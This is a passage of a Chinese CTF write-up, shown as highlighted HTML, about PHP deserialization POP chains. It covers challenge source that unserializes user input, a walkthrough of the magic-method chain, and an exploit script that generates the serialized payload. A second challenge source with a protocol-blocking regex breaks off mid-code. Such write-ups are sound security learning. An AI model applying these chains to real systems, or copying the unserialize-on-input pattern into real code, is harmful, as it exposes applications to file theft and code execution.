#D4D4D4">);</span></span><span class="line"><span style="color: #DCDCAA">highlight_file</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">__FILE__</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #6A9955">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Start</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$name</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">protected</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"Welcome to NewStarCTF, "</span><span style="color: #D4D4D4">.</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__isset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$var</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        (</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">func</span><span style="color: #D4D4D4">)();</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Sec</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$var</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__toString</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">check</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">var</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"CTFers"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__invoke</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">file_get_contents</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/flag'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Easy</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$cla</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__call</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$fun</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$var</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">cla</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">clone</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$var</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">eeee</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$obj</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__clone</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">cmd</span><span style="color: #D4D4D4">)){</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"success"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_POST</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'pop'</span><span style="color: #D4D4D4">])){</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">unserialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_POST</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'pop'</span><span style="color: #D4D4D4">]);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>2. 找 pop 链</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">先找魔术方法，__destruct，__isset，__toString，__invoke，__clone</span></span><span class="line"><span style="color: #D4D4D4">__destruct()//对象被销毁时触发</span></span><span class="line"><span style="color: #D4D4D4">__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</span></span><span class="line"><span style="color: #D4D4D4">__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span></span><span class="line"><span style="color: #D4D4D4">__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。</span></span><span class="line"><span style="color: #D4D4D4">__clone   使用clone方法复制一个对象时，对象会自动调用__clone魔术方法</span></span><span class="line"><span style="color: #D4D4D4">先看入口：__destruct方法，出口粗看一眼大概率就是__invoke,现在就是要构造一条从入口到出口的pop链。</span></span><span class="line"><span style="color: #D4D4D4">__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</span></span><span class="line"><span style="color: #D4D4D4">寻找链条：</span></span><span class="line"><span style="color: #D4D4D4">__destruct(Start)方法里有echo，触发__toString(Sec)，toString里的check可以触发__call(Eazy),__call里面用了clone函数，触发了__clone(eeee)方法，调用了isset函数，isset函数又恰好调用了未定义属性cmd，触发了__isset()魔术方法,__isset(Start)里以函数的形式可以调用一个对象，只需要把一个对象赋值给$func变量就可以触发__invoke(Sec)方法了。</span></span><span class="line"><span style="color: #D4D4D4">Start-&gt;__destruct 触发 Sec-&gt;__toString 触发 Easy-&gt;__call</span></span><span class="line"><span style="color: #D4D4D4">触发 eeee-&gt;__clone 触发 Start-&gt;__isset 触发 Sec-&gt;invoke</span></span></code></pre></div></div></figure><p>3.exp (exp 写不出来，看了别人的自己复现出的，多看几遍)</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Start</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$name</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">protected</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$func</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">func</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Sec</span><span style="color: #D4D4D4">();  </span><span style="color: #6A9955">//因为要触发invoke，invoke在Sec类里</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Sec</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$var</span><span style="color: #D4D4D4">;    </span><span style="color: #6A9955">//不是很理解为什么这里可以改成public</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Easy</span><span style="color: #D4D4D4">();    </span><span style="color: #6A9955">//触发 Easy-&gt;__call,call传两个参数，触发__clone是取决于var参数</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Easy</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$cla</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">eeee</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Start</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Sec</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$c</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Easy</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$d</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">eeee</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">;    </span><span style="color: #6A9955">//可以触发 Sec-&gt;__toString，所以写这里</span></span><span class="line"><span style="color: #9CDCFE">$d</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">=</span><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">;     </span><span style="color: #6A9955">//因为要触发 Start-&gt;__isset</span></span><span class="line"><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">var</span><span style="color: #D4D4D4">=</span><span style="color: #9CDCFE">$d</span><span style="color: #D4D4D4">;     </span><span style="color: #6A9955">//触发eeee-&gt;__clone</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">urlencode</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">serialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$d</span><span style="color: #D4D4D4">));</span><span style="color: #6A9955">//$d传参进去马上被反序列化，因为$d-&gt;obj=$a，所以直接触发Start-&gt;__destruct</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">//Start-&gt;__destruct 触发 Sec-&gt;__toString 触发 Easy-&gt;__call</span></span><span class="line"><span style="color: #6A9955">//触发 eeee-&gt;__clone 触发 Start-&gt;__isset 触发 Sec-&gt;invoke</span></span></code></pre></div></div></figure><h3 id="写个demo题试试水以后补充"><a class="markdownIt-Anchor" href="#写个demo题试试水以后补充"></a> 写个 demo 题试试水 (以后补充)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #6A9955">//flag is in flag.php</span></span><span class="line"><span style="color: #DCDCAA">error_reporting</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Read</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$var</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">file_get</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$value</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$text</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">base64_encode</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">file_get_contents</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$value</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$text</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__invoke</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$content</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">file_get</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">var</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$content</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Show</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$source</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$str</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">'index.php'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">source</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">source</span><span style="color: #D4D4D4">.</span><span style="color: #CE9178">'Welcome'</span><span style="color: #D4D4D4">.</span><span style="color: #CE9178">"&lt;br&gt;"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__toString</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">str</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'str'</span><span style="color: #D4D4D4">]-&gt;</span><span style="color: #9CDCFE">source</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">_show</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">preg_match</span><span style="color: #D4D4D4">(</span><span style="color: #D16969">'/gopher|http|ftp|https|dict|</span><span style="color: #D7BA7D">\.\.</span><span style="color: #D16969">|flag|file/i'</span><span style="color: #D4D4D4">,</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">source</span><span style="color: #D4D4D4">))  {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">die</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'hacker'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">highlight_file</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">source</span><span style="color: #D4D4D4">); </span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__wakeup</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">preg_match</span><span style="color: #D4D4D4">(</span><span style="color: #D16969">"/gopher|http|file|ftp|https|dict|</span><span style="color: #D7BA7D">\.\.</span><span style="color: #D16969">/i"</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">source</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"hacker"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">source</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"index.php"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Test</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$p</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">p</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">array</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__get</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$key</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$function</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">p</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$function</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_GET</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'hello'</span><span style="color: #D4D4D4">]))</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">unserialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_GET</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'hello'</span><span style="color: #D4D4D4">]);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">else</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">$show</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Show</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'pop3.php'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">$show</span><span style="color: #D4D4D4">-&gt;</span><span style="color: 